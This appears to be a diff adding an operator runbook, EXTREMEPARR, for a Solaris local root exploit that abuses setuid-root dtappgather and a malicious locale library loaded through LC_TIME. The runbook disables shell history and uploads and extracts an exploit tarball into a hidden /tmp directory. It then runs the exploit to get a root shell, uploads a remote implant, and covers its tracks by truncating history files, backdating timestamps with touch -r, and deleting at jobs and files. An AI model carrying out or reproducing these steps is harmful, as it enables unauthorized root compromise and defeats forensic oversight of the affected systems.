@@ -1,0 +1,272 @@
+############################ EXTREMEPARR as of Thu Sep  8 10:43:49 EDT 2011
+############### If not in NOPEN, do this if you haven't already done so:
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+
+
+############### Is it there and is it setuid-root?
+##### If not, stop (duh)
+-ls /usr/dt/bin/dtappgather
+
+
+################ First, add these to your PATH, as they might have suids that work:
+-addpath /usr/bin/sparcv7 /usr/bin/sparcv9 /usr/sbin/sparcv7 /usr/sbin/sparcv9
+
+
+################ Find suid root app that uses locales....possible candidates are:
+################ ("at" seems the most reliably set to be setuid-root)
+################ If one can't be found, stop here
+
+-lss -U -g r.s.*root -P who w whodo at ps ls
+
+################ Examine paths returned by the above to verify suid root app
+################ -rwsr-xr-x    1 root     sys	/bin/whatever
+
+
+################ DO THIS ONLY IF YOU ARE GOING TO USE "at" as your suid binary
+################ Check for existence of these files.  If the "at.allow" files
+################ exist, our current uid must be explicitly stated in the 
+################ "at.allow" file.  If "at.allow" does not exist but "at.deny"
+################ does, we're ok as long as we're NOT in the file.  If none of
+################ files exist, we're screwed.
+
+-lt /etc/cron.d/at.allow /etc/cron.d/at.deny /usr/lib/cron/at.allow /usr/lib/cron/at.deny
+-cat /etc/cron.d/at.allow
+-cat /etc/cron.d/at.deny
+-cat /usr/lib/cron/at.allow
+-cat /usr/lib/cron/at.deny
+
+################ Upload tarball to target
+##### NOPEN
+-pwd
+-cd /tmp/.scsi
+-put /current/up/exp.tar.Z e.tar.Z
+
+##### ftshell
+pwd
+cd /tmp/.scsi
+~~p
+/current/up/exp.tar.Z e.tar.Z
+
+
+############### Extract our cool stuff...
+uncompress e.tar.Z && tar xvf e.tar
+
+
+############### Make sure needed files are there:
+  ##### If Solaris 2.6 Sparc
+  ls -la su.so.2.6s && cp su.so.2.6s su.so.2
+  ls -la exp.s && cp exp.s exp
+
+  ##### If Solaris 2.[789] Sparc
+  ls -la su.so.2.789s && cp su.so.2.789s su.so.2
+  ls -la exp.s && cp exp.s exp
+
+  ##### If Solaris 10 or 11 Sparc
+  ls -la su.so.2.1011s && cp su.so.2.1011s su.so.2
+  ls -la exp.s && cp exp.s exp
+
+  ##### If Solaris 2.6 Intel
+  ls -la su.so.2.6x && cp su.so.2.6s su.so.2
+  ls -la exp.x && cp exp.x exp
+
+  ##### If Solaris 2.[789] Intel
+  ls -la su.so.2.789x && cp su.so.2.789x su.so.2
+  ls -la exp.x && cp exp.x exp
+
+  ##### If Solaris 10 or 11 Intel
+  ls -la su.so.2.1011x && cp su.so.2.1011x su.so.2
+  ls -la exp.x && cp exp.x exp
+
+############### Make sure name of locale we are "installing" does not exist
+-ls /usr/lib/locale/su
+
+
+##### If for some goofy reason it does exist, choose a name of a directory that
+##### does not exist in /usr/lib/locale, and use that name in the next command
+##### for NEWNAME
+cp su.so.2 NEWNAME.so.2
+
+
+##### Save these listings so we can restore proper permissions and such later
+##### EXTREMEPARR should print out commands to restore these, but will used these
+##### to compare to later in the script (also, itime doesn't exist for 2.10+, may
+##### need to use touch or Ctrl after a STOIC install).
+#mtime: 
+ls -al /usr/lib | egrep "(locale|\.$)"
+ls -al /var/dt/appconfig | egrep "(appmanager|\.$)"
+ls -al /var/dt | egrep "(appconfig|\.$)"
+#utime (access):
+ls -alu /usr/lib | egrep "(locale|\.$)"
+ls -alu /var/dt/appconfig | egrep "(appmanager|\.$)"
+ls -alu /var/dt | egrep "(appconfig|\.$)"
+#ctime (inode change):
+ls -alc /usr/lib | egrep "(locale|\.$)"
+ls -alc /var/dt/appconfig | egrep "(appmanager|\.$)"
+ls -alc /var/dt | egrep "(appconfig|\.$)"
+
+
+##### NEW: You can now immediately use the "at" command to get your shell
+#####      immediately when running this, rather that setting up environment
+#####      and running commands separately. Make sure to save any cmds spit
+#####      out by exploit for restoring things. 
+#####
+#####      Do this new method with the following command:
+
+### Using NOPEN (see old way below for other shell syntax if not using NOPEN)
+-shell
+AT=1; export AT; ./exp su
+### or ###
+-shell
+AT=1; export AT; ./exp NEWNAME
+
+
+
+##################################################################################
+##### If you ran exp with the above command with AT environment variable, skip
+##### down to the "I AM ROOT" line in this script.
+
+
+
+##### OLD: Run the exploit and save the commands to restores permissions/timestamps it spits out
+./exp su
+### or ###
+./exp NEWNAME
+
+##### If exploit fails at first, run again with new name for shared object
+cp su.so.2 ANOTHERNAME.so.2
+./exp ANOTHERNAME
+
+############## If you are using NOPEN, use -shell from now until we have root
+-shell
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+
+
+############## Find the suid root program that uses locales
+##### If you need to use at -l, set an at job first
+##### Save the at job number in your script
+echo "" | at now + 180 mins
+
+##### Set up the environment variable...
+  ## If in Bourne shell or -shell in NOPEN
+  LC_TIME=su
+  ## OR ##
+  LC_TIME=NEWNAME
+
+  export LC_TIME
+
+  ## If in csh
+  setenv LC_TIME su
+  ## OR ##
+  setenv LC_TIME NEWNAME
+
+  ## If in ksh or bash
+  export LC_TIME=su
+  ## OR ##
+  export LC_TIME=NEWNAME
+
+
+##### Check to make sure the setting of the environment variable worked
+echo $LC_TIME
+
+
+##### Run your setuid program: choose the appropriate one you found before
+who
+w
+whodo
+at -l
+ps -ef
+ls -la
+
+
+##################################################################################
+
+
+##### I AM ROOT! (hopefully)
+##### You should now see a root prompt or nothing, but you may be root anyway, so:
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+id
+pwd
+
+##### Get out of whatever goofy directory the exploit puts you in, and see if
+##### anything changed in the directory you got stuck in (shouldn't happen, but
+##### worth checking anyway)
+ls -lart
+mkdir WORKINGDIR
+cd WORKINGDIR
+
+
+##### Upload NOPEN and run it, or start NOPEN on a different port if you were 
+##### already in NOPEN and smartly left the binary there
+
+##### Connect to the root NOPEN then exit the exploit shell and connection
+#exit
+#exit
+#-burnBURN
+##### The rest should be done from a root NOPEN
+
+############# If you had to use at (either yourself or with the AT
+############# environment variable option)....remove at job
+##### Do this once you have NOPEN running and can exit from the shell
+at -l
+at -r YOURATJOB.a
+at -l
+
+############### Once NOPEN is running as root and you have exited the root shell...
+############### Clean up history file if needed
+-ls HISTORYFILE
+tail -50 HISTORYFILE
+
+
+##### Fix as necessary
+##### LEGITNUM = number of lines in history that are legit (before us)
+wc -l HISTORYFILE        
+head -LEGITNUM HISTORYFILE > t
+cat t > HISTORYFILE
+touch -r SOMEFILE HISTORYFILE
+
+
+################ Repairing what the "exp" binary did
+##### remove our locales that we made
+##### if there were failures, make sure to remove them too
+##### failures will be obvious from ls -lart, not from owners
+##### rm -rf of anything not good, do it this way
+-lt /usr/lib/locale
+
+rm /usr/lib/locale/su/*
+## OR ##
+rm /usr/lib/locale/NEWNAME/*
+
+rmdir /usr/lib/locale/su
+## OR ##
+rmdir /usr/lib/locale/NEWNAME
+
+############### Run the commands spit out by the exploit to restore
+############### ownerships/permissions/timestamps/etc.
+##### Put up the correct itime in order to run cleanup commands
+-put /current/up/itime <TAB> it
+
+
+##### Now check to make sure things match the previous saved output
+ls -al /usr/lib | egrep "(locale|\.$)"
+ls -al /var/dt/appconfig | egrep "(appmanager|\.$)"
+ls -al /var/dt | egrep "(appconfig|\.$)"
+
+############## If you used "at", check crontabs and logs
+-lt /var/adm
+-lt /var/spool/cron
+-lt /var/spool/cron/atjobs
+touch -r /var/spool/cron/crontabs /var/spool/cron/atjobs
+-tail -40 /var/cron/log
+
+############## Don't forget to delete stuff in working directory
+-lt
+rm sendmail su.so.2* exp* e.tar it
+
+
+############## You're all done.....do what you gotta do..........
